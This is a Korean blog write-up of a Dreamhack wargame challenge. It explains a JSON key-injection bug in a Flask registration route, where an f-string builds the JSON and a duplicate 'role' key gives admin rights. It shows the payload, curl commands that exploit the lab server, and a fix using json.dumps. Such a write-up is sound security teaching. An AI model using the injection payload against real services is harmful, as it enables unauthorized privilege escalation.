---
layout: post
title:  "Dreamhack 워게임 {\"role\":\"admin\"} 풀이 — f-string 으로 JSON 만들면 발생하는 키 인젝션과 권한 상승"
date:   2026-05-19 14:30:00 +0900
categories: security web wargame dreamhack writeup json injection flask python privilege-escalation
---

## 들어가며

Dreamhack 웹해킹 워게임 **`{"role":"admin"}`** (난이도 별 1, 풀이자 415명) 풀이입니다. 제목에 정답이 통째로 박혀있는 솔직한 문제예요. 본질은 **"JSON 을 만들 때 라이브러리(`json.dumps`) 가 아니라 f-string 으로 만들면 인용부호 escape 가 풀리고, 그 결과 추가 키를 사용자 입력으로 끼워넣을 수 있다"** 는 한 줄짜리 취약점.

문제 설명:

> Can you gain admin access?

스포일러 결론:

```bash
SERVER="http://host3.dreamhack.games:PORT"

# 1) username 안에 JSON 키 인젝션해서 role:admin 으로 회원가입
curl -X POST "$SERVER/register" \
  --data-urlencode 'username=pwn","role":"admin","x":"' \
  --data-urlencode 'password=pwn123'

# 2) 로그인
curl -c jar.txt -X POST "$SERVER/login" \
  --data-urlencode 'username=pwn' --data-urlencode 'password=pwn123'

# 3) 플래그
curl -b jar.txt "$SERVER/flag"
# → {"flag":"DH{d2h5X2RpZF95b3VfZGVjb2RlX3RoaXM=}"}
```

플래그 본문을 base64 디코드하면 `why_did_you_decode_this` — 출제자의 농담.

## 1. 자료 파악

ZIP 안에는 Flask 앱 한 파일과 템플릿 3장:

```
app.py
Dockerfile
requirements.txt          (Flask==3.0.3)
templates/{login,index,register}.html
```

`app.py` 만 보면 됩니다. 메모리 위에 사용자 사전을 만들어두는 작은 인증 서비스예요.

```python
USERS = {}
UID = {}

USERS[1] = {"uid": 1, "username": "admin", "pw": pw_hash("**REDACTED**"), "role": "admin"}
UID["admin"] = 1

USERS[2] = {"uid": 2, "username": "guest", "pw": pw_hash("guest"),       "role": "user"}
UID["guest"] = 2

@app.route("/flag")
def flag():
    user = current_user()
    if user and user.get("role") == "admin":
        return jsonify(flag=FLAG)
    ...
```

목표는 단순: **`role == "admin"` 인 세션을 만드는 것**. 정공법으로는 admin 의 비밀번호를 알 방법이 없으니, "회원가입 흐름에서 admin role 을 만들 수 있는가" 가 자연스러운 질문이 됩니다.

## 2. 1차 코드 리뷰 — `/register` 가 너무 정직하게 의심스럽다

진짜 함정이 있는 곳:

```python
@app.route("/register", methods=["GET", "POST"])
def register():
    ...
    username = request.form.get("username").strip()
    password = request.form.get("password")

    uid = str(uuid.uuid4())
    pw = pw_hash(password)

    raw_user = (
        f'{{"role":"user",'
        f'"username":"{username}",'
        f'"pw":"{pw}",'
        f'"uid":"{uid}"}}'
    )

    try:
        user = json.loads(raw_user)
    except Exception:
        return render_template("register.html", title="Register", error="회원가입에 실패했습니다."), 400

    final_username = str(user.get("username", "")).strip()
    if final_username in UID:
        return render_template("register.html", title="Register", error="이미 존재하는 username입니다."), 409

    USERS[user["uid"]] = user
    UID[final_username] = user["uid"]
    ...
```

`raw_user` 가 **JSON 문자열을 f-string 으로 직접 조립** 하고 있습니다. `json.dumps({"username": username, ...})` 이 아니라요. 이게 문제의 전부.

이런 코드를 보면 머릿속에서 빨간 등이 켜져야 합니다: **"사용자 입력을 직접 직렬화 포맷 안에 박아넣는다 = 그 포맷의 메타문자(`"`, `\`, `,` ...)를 통제할 수 있다"**.

## 3. 페이로드 만들기 — 한 번에 새 키를 끼워넣자

### 3.1 어떤 모양이 나오는가

`username` 을 그대로 박는다고 했을 때, 이런 입력을 넣으면:

```
username = pwn","role":"admin","x":"
```

`raw_user` 는 이렇게 됩니다:

```
{"role":"user","username":"pwn","role":"admin","x":"","pw":"<hash>","uid":"<uuid>"}
```

따옴표 쌍을 한 번 닫고(`pwn"`), 새 키 `"role":"admin"` 과 `"x":""` 를 끼워넣은 다음, 원래 코드의 뒤 따옴표(`,...`) 가 자연스럽게 다시 닫히게 만든 거죠. JSON 문법적으로도 깨지지 않고 잘 파싱됩니다.

### 3.2 JSON 의 "중복 키" 룰

이 페이로드의 핵심은 RFC 8259 가 정한 두 가지 자유입니다:

- **중복 키를 가진 객체의 동작은 unspecified**. 파서가 어떻게 해도 된다.
- **대부분의 실용 파서는 "나중에 나온 값으로 덮어쓴다" (last-wins)**. Python `json.loads` 도 그렇습니다.

확인하면:

```python
>>> json.loads('{"role":"user","role":"admin"}')
{'role': 'admin'}
```

따라서 우리가 만든 `raw_user` 는:

```python
>>> json.loads('{"role":"user","username":"pwn","role":"admin","x":"","pw":"...","uid":"..."}')
{'role': 'admin', 'username': 'pwn', 'x': '', 'pw': '...', 'uid': '...'}
```

→ **role 이 admin 으로 덮인 dict** 가 만들어집니다. 그리고 이게 그대로 `USERS[uuid]` 에 저장돼요.

### 3.3 왜 username 을 `pwn` 으로 시작하게 했나

가장 직관적인 페이로드는 `","role":"admin","x":"` (앞에 아무것도 없이) 로 시작해서 `username = ""` 으로 만드는 것입니다. 하지만:

```python
if not username or not password:
    return render_template("register.html", ..., error="..."), 400
```

`/login` 도 `/register` 도 빈 username 을 거부합니다. 그래서 **로그인 시 사용할 수 있는 빈 문자열이 아닌 username** 을 남겨야 해요. `pwn` 같은 평범한 값으로 시작 → JSON 인젝션 → 결국 `username:"pwn"` 이 남게 만드는 게 깔끔합니다.

## 4. 익스플로잇

### 4.1 단계별

1. **회원가입 with payload**:
   ```bash
   curl -X POST "$SERVER/register" \
     --data-urlencode 'username=pwn","role":"admin","x":"' \
     --data-urlencode 'password=pwn123'
   # → 302 /login
   ```
2. **로그인**:
   ```bash
   curl -c jar.txt -X POST "$SERVER/login" \
     --data-urlencode 'username=pwn' --data-urlencode 'password=pwn123'
   # → 302 /  + Set-Cookie: session=...
   ```
3. **세션이 진짜 admin 인지 확인**:
   ```bash
   curl -b jar.txt "$SERVER/me"
   # → {"user":{"role":"admin","uid":"e823811f-...","username":"pwn","x":""}}
   ```
4. **플래그**:
   ```bash
   curl -b jar.txt "$SERVER/flag"
   # → {"flag":"DH{d2h5X2RpZF95b3VfZGVjb2RlX3RoaXM=}"}
   ```

### 4.2 한 단계씩 검증

- `username = pwn","role":"admin","x":"` → URL-encode 거쳐도 서버에서는 원본 그대로 도착.
- 서버에서 f-string 으로 조립 → JSON 으로 파싱 → `role` 키 마지막 값(`admin`) 이 채택됨.
- `final_username = "pwn"`, 신규라 UID 충돌 없음.
- `USERS[uuid] = {role:admin, username:pwn, pw:sha256(pwn123), uid:uuid, x:""}`.
- 로그인 흐름은 정상 — UID["pwn"] 으로 조회되고 pw 해시도 일치.
- `/flag` 의 `role == "admin"` 검사 통과 ✅.

> 비유: 이력서를 자유 양식으로 받아서 **모범답안 양식에 그대로 풀로 붙여 넣어** 처리하는 회사. 이력서에 `이름: 김OO, 직급: 사원` 만 적은 게 아니라 그 아래에 `직급: 사장` 도 적어두면 양식의 마지막 줄이 채택되어서 모범답안에 사장으로 들어가는 그림.

## 5. 안전하게 고치기

`json.dumps` 하나로 끝나는 이야기입니다.

```python
import json

user = {
    "role": "user",            # 절대 사용자 입력으로 덮이지 않음 (서버가 마지막에 덮어쓰면 더 안전)
    "username": username,
    "pw": pw_hash(password),
    "uid": uid,
}

# 굳이 raw 문자열이 필요할 때만 한 번에 직렬화
raw_user = json.dumps(user, ensure_ascii=False)
```

`json.dumps` 는 `"` → `\"` 같은 메타문자 escape 를 알아서 합니다. 그리고 더 좋은 건 **굳이 문자열로 만들 필요 자체가 없다** 는 것. 이 코드의 `raw_user` → `json.loads` 왕복은 사용자 입력을 "정화" 하는 어떤 효과도 없고, 그냥 깨지기 쉬운 직렬화/역직렬화를 한 번 더 끼워넣을 뿐입니다.

추가로 한 줄 더:

```python
# role 같은 권한 필드는 사용자 입력에서 절대 받지 말고
# 마지막에 서버가 다시 덮어쓰는 패턴이 안전 (defense in depth)
user["role"] = "user"
```

last-wins 룰을 우리가 의도적으로 이용하는 셈입니다.

## 6. 한 번 더 정리

### 6.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| f-string 으로 JSON 조립 | Improper Encoding | 직렬화 라이브러리를 안 씀 |
| 사용자 입력 escape 없음 | Injection (CWE-74) | `"` 자체를 통제 못함 |
| 중복 키 last-wins 동작 | Spec 모호함 활용 | RFC 8259 가 unspecified |
| `role` 을 클라이언트 제어 영역에 둠 | Privilege Escalation | 권한 필드 책임 분리 부재 |

### 6.2 입문자가 챙겨가면 좋은 시각

- **"문자열로 데이터 포맷 만들지 마라"** 는 SQL 인젝션 시절부터 30년째 같은 교훈. JSON, XML, YAML, URL, HTML 모두 같다.
- **중복 키, 트레일링 콤마, BOM, 주석** 같은 "스펙 회색지대" 는 보안 검사에서 무조건 의심해야 한다.
- 권한/역할 필드는 **사용자 입력으로부터 가장 늦게 결정** 되어야 한다 — 마지막에 서버가 명시적으로 덮어쓰자.

## 7. 시도했지만 실패한 것들 (회고)

이번 회차는 매우 깔끔하게 풀려서 따로 헛수고는 없었지만, 풀이 직전에 잠시 고민했던 두 가지를 적어둡니다.

### 7.1 빈 username 페이로드 → 가드에 막힘

처음 시도한 페이로드는 `","role":"admin","x":"` (앞을 비움) 이었습니다. JSON 인젝션은 깔끔하게 되지만, 결과 username 이 `""` 가 되어버려서 `/login` 의 `if not username or not password` 가드에 막혔습니다. **JSON 파싱 단계의 성공만 보고 안심하지 말고, 그 결과로 뒤따라오는 사용자 흐름까지 시뮬레이션해야 한다** 는 교훈. 페이로드를 `pwn","role":"admin","x":"` 으로 살짝 바꿔서 username 을 `pwn` 으로 남기는 것으로 해결.

### 7.2 password 필드를 노린 인젝션 후보

처음엔 `username` 보다 `password` 쪽이 더 길고 자유로워 보여서 그쪽에서 시작할까 잠깐 고민. 하지만 password 는 `pw_hash()` 를 거친 SHA-256 16진 문자열로 들어가서 JSON 문자열 안에 안전합니다. 16진수 + 영문자 64자라 메타문자가 끼어들 여지가 없음. **입력 → 가공 → 직렬화** 의 가공 단계에서 이미 escape 와 동치인 처리가 일어나는지를 먼저 보는 게 중요. 30초 만에 password 경로 포기하고 username 으로 돌아옴.

---

f-string 으로 JSON 만들지 마세요. `json.dumps` 가 그 일을 하라고 있는 것입니다.
